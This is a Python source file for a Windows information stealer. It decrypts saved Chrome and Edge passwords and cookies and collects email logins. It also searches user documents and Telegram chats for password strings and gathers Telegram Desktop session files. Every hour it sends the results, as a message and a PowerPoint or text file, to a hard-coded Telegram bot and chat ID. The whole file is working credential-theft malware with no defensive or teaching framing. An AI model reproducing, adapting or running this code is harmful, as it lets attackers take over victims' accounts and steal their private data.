import os
import sys
import shutil
import sqlite3
import socket
import platform
import getpass
import psutil
import base64
import requests
import json
import time
from datetime import datetime
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import threading
import re
import glob
import win32crypt
from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty

try:
    from pptx import Presentation
    from pptx.util import Inches
    PPTX_AVAILABLE = True
except ImportError:
    PPTX_AVAILABLE = False

class Stealer:
    def __init__(self):
        self.data_dir = os.path.join(os.getenv('TEMP'), 'stealer_data')
        os.makedirs(self.data_dir, exist_ok=True)
        self.output_file = os.path.join(self.data_dir, 'collected_data.txt')
        self.pptx_file = os.path.join(self.data_dir, 'collected_data.pptx')
        self.fallback_file = os.path.join(self.data_dir, 'collected_data_fallback.txt')
        self.bot_token = '7633564425:AAHFz2tT1Ftk0xqI8mslHwbImBvJPOQzs-o'
        self.chat_id = '5291134569'
        self.telegram_text_api = f'https://api.telegram.org/bot{self.bot_token}/sendMessage'
        self.telegram_file_api = f'https://api.telegram.org/bot{self.bot_token}/sendDocument'
        self.api_id = 123456  # Placeholder: replace with actual Telegram API ID
        self.api_hash = 'your_api_hash'  # Placeholder: replace with actual Telegram API hash
        self.session_file = os.path.join(self.data_dir, 'telegram_session')

    def get_system_info(self):
        info = {}
        info['hostname'] = socket.gethostname()
        info['ip'] = socket.gethostbyname(socket.gethostname())
        info['os'] = platform.system() + ' ' + platform.release()
        info['username'] = getpass.getuser()
        info['cpu'] = platform.processor()
        info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + ' GB'
        return info

    def get_browser_paths(self):
        browsers = {
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
        }
        return browsers

    def decrypt_chrome_password(self, encrypted_password, key):
        try:
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                iv = encrypted_password[3:15]
                payload = encrypted_password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted_pass = unpad(cipher.decrypt(payload), 16)
                return decrypted_pass.decode()
            else:
                decrypted_pass = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                return decrypted_pass.decode()
        except:
            return ''

    def get_chrome_encryption_key(self):
        local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            key = key[5:]  # Remove 'DPAPI' prefix
            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            return key
        except:
            return None

    def filter_valid_data(self, data_list):
        filtered = []
        for item in data_list:
            if item and len(item) > 3:
                filtered.append(item)
        return filtered

    def get_browser_passwords(self):
        passwords = []
        browsers = self.get_browser_paths()
        for browser, path in browsers.items():
            if os.path.exists(path):
                try:
                    key = self.get_chrome_encryption_key()
                    if not key:
                        continue
                    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
                    for profile in profiles:
                        login_data = os.path.join(path, profile, 'Login Data')
                        if os.path.exists(login_data):
                            temp_db = os.path.join(self.data_dir, f'{browser}_{profile}_Login_Data')
                            shutil.copy2(login_data, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                            for row in cursor.fetchall():
                                url, username, encrypted_password = row
                                password = self.decrypt_chrome_password(encrypted_password, key) if encrypted_password else ''
                                if username or password:
                                    passwords.append(f'{browser} | URL: {url} | User: {username} | Pass: {password}')
                            conn.close()
                            os.remove(temp_db)
                except:
                    pass
        return self.filter_valid_data(passwords)

    def get_browser_cookies(self):
        cookies = []
        browsers = self.get_browser_paths()
        for browser, path in browsers.items():
            if os.path.exists(path):
                try:
                    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
                    for profile in profiles:
                        cookie_data = os.path.join(path, profile, 'Cookies')
                        if os.path.exists(cookie_data):
                            temp_db = os.path.join(self.data_dir, f'{browser}_{profile}_Cookies')
                            shutil.copy2(cookie_data, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
                            for row in cursor.fetchall():
                                host, name, value, encrypted_value = row
                                if encrypted_value:
                                    key = self.get_chrome_encryption_key()
                                    if key:
                                        value = self.decrypt_chrome_password(encrypted_value, key) or value
                                if host and name and value:
                                    cookies.append(f'{browser} | Host: {host} | Name: {name} | Value: {value}')
                            conn.close()
                            os.remove(temp_db)
                except:
                    pass
        return self.filter_valid_data(cookies)

    def get_browser_emails(self):
        emails = []
        browsers = self.get_browser_paths()
        for browser, path in browsers.items():
            if os.path.exists(path):
                try:
                    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
                    for profile in profiles:
                        login_data = os.path.join(path, profile, 'Login Data')
                        if os.path.exists(login_data):
                            temp_db = os.path.join(self.data_dir, f'{browser}_{profile}_Login_Data')
                            shutil.copy2(login_data, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT username_value FROM logins')
                            for row in cursor.fetchall():
                                email = row[0]
                                if email and re.match(r'[^@]+@[^@]+\.[^@]+', email):
                                    emails.append(f'{browser} | Email: {email}')
                            conn.close()
                            os.remove(temp_db)
                except:
                    pass
        return self.filter_valid_data(emails)

    def search_files_for_passwords(self):
        found_data = []
        search_paths = [
            os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
            os.path.join(os.getenv('USERPROFILE'), 'Documents'),
            os.path.join(os.getenv('USERPROFILE'), 'Downloads')
        ]
        for path in search_paths:
            for ext in ['*.txt', '*.docx', '*.pdf']:
                for file in glob.glob(os.path.join(path, ext)):
                    try:
                        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            passwords = re.findall(r'(?i)(?:password|pass|pwd|key):?\s*[\S]{6,}', content)
                            if passwords:
                                found_data.append(f'File: {file} | Found: {"; ".join(passwords)}')
                    except:
                        pass
        return self.filter_valid_data(found_data)

    def get_telegram_data(self):
        telegram_data = []
        try:
            client = TelegramClient(self.session_file, self.api_id, self.api_hash)
            client.start()
            dialogs = client(GetDialogsRequest(
                offset_date=None,
                offset_id=0,
                offset_peer=InputPeerEmpty(),
                limit=100,
                hash=0
            )).to_dict()
            for dialog in dialogs['dialogs']:
                try:
                    chat_id = dialog['peer']['user_id'] or dialog['peer']['chat_id'] or dialog['peer']['channel_id']
                    messages = client.get_messages(chat_id, limit=50)
                    for msg in messages:
                        if msg.message:
                            passwords = re.findall(r'(?i)(?:password|pass|pwd|key):?\s*[\S]{6,}', msg.message)
                            if passwords:
                                telegram_data.append(f'Telegram Chat {chat_id} | Found: {"; ".join(passwords)}')
                except:
                    pass
            client.disconnect()
        except:
            pass
        return self.filter_valid_data(telegram_data)

    def get_telegram_session(self):
        session_files = []
        session_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
        if os.path.exists(session_path):
            for file in glob.glob(os.path.join(session_path, '*')):
                if os.path.isfile(file):
                    session_files.append(file)
        return session_files

    def create_pptx(self, passwords, cookies, emails, files_data, telegram_data, session_files):
        if not PPTX_AVAILABLE:
            with open(self.fallback_file, 'w', encoding='utf-8') as f:
                f.write('System Info:\n')
                for k, v in self.get_system_info().items():
                    f.write(f'{k}: {v}\n')
                f.write('\nPasswords:\n')
                f.write('\n'.join(passwords) if passwords else 'No passwords found.\n')
                f.write('\nCookies:\n')
                f.write('\n'.join(cookies) if cookies else 'No cookies found.\n')
                f.write('\nEmails:\n')
                f.write('\n'.join(emails) if emails else 'No emails found.\n')
                f.write('\nFile Data:\n')
                f.write('\n'.join(files_data) if files_data else 'No file data found.\n')
                f.write('\nTelegram Data:\n')
                f.write('\n'.join(telegram_data) if telegram_data else 'No Telegram data found.\n')
                f.write('\nTelegram Session Files:\n')
                f.write('\n'.join(session_files) if session_files else 'No session files found.\n')
            return self.fallback_file
        prs = Presentation()
        slide_layout = prs.slide_layouts[1]
        slide = prs.slides.add_slide(slide_layout)
        title = slide.shapes.title
        title.text = 'Collected Data'
        content = slide.placeholders[1]
        content.text = 'System Info:\n'
        for k, v in self.get_system_info().items():
            content.text += f'{k}: {v}\n'
        content.text += '\nPasswords:\n'
        content.text += '\n'.join(passwords) if passwords else 'No passwords found.'
        content.text += '\n\nCookies:\n'
        content.text += '\n'.join(cookies) if cookies else 'No cookies found.'
        content.text += '\n\nEmails:\n'
        content.text += '\n'.join(emails) if emails else 'No emails found.'
        content.text += '\n\nFile Data:\n'
        content.text += '\n'.join(files_data) if files_data else 'No file data found.'
        content.text += '\n\nTelegram Data:\n'
        content.text += '\n'.join(telegram_data) if telegram_data else 'No Telegram data found.'
        content.text += '\n\nTelegram Session Files:\n'
        content.text += '\n'.join(session_files) if session_files else 'No session files found.'
        prs.save(self.pptx_file)
        return self.pptx_file

    def send_to_telegram(self):
        passwords = self.get_browser_passwords()
        cookies = self.get_browser_cookies()
        emails = self.get_browser_emails()
        files_data = self.search_files_for_passwords()
        telegram_data = self.get_telegram_data()
        session_files = self.get_telegram_session()
        
        # Send text message
        data = []
        data.append('System Info:')
        for k, v in self.get_system_info().items():
            data.append(f'{k}: {v}')
        data.append('\nPasswords:')
        data.extend(passwords if passwords else ['No passwords found.'])
        data.append('\nCookies:')
        data.extend(cookies if cookies else ['No cookies found.'])
        data.append('\nEmails:')
        data.extend(emails if emails else ['No emails found.'])
        data.append('\nFile Data:')
        data.extend(files_data if files_data else ['No file data found.'])
        data.append('\nTelegram Data:')
        data.extend(telegram_data if telegram_data else ['No Telegram data found.'])
        data.append('\nTelegram Session Files:')
        data.extend(session_files if session_files else ['No session files found.'])
        
        message = '\n'.join(data)
        if len(message) > 4096:
            message = message[:4000] + '\n... [Truncated]'
        
        text_payload = {
            'chat_id': self.chat_id,
            'text': message
        }
        try:
            requests.post(self.telegram_text_api, data=text_payload)
        except:
            pass

        # Send file (PowerPoint or fallback text)
        file_path = self.create_pptx(passwords, cookies, emails, files_data, telegram_data, session_files)
        with open(file_path, 'rb') as f:
            files = {'document': (os.path.basename(file_path), f)}
            file_payload = {'chat_id': self.chat_id}
            try:
                requests.post(self.telegram_file_api, data=file_payload, files=files)
            except:
                pass

        # Send Telegram session files
        for session_file in session_files:
            with open(session_file, 'rb') as f:
                files = {'document': (os.path.basename(session_file), f)}
                file_payload = {'chat_id': self.chat_id}
                try:
                    requests.post(self.telegram_file_api, data=file_payload, files=files)
                except:
                    pass

    def run(self):
        while True:  # Keep stealer active
            threads = []
            threads.append(threading.Thread(target=self.send_to_telegram))
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            time.sleep(3600)  # Run every hour

if __name__ == '__main__':
    stealer = Stealer()
    stealer.run()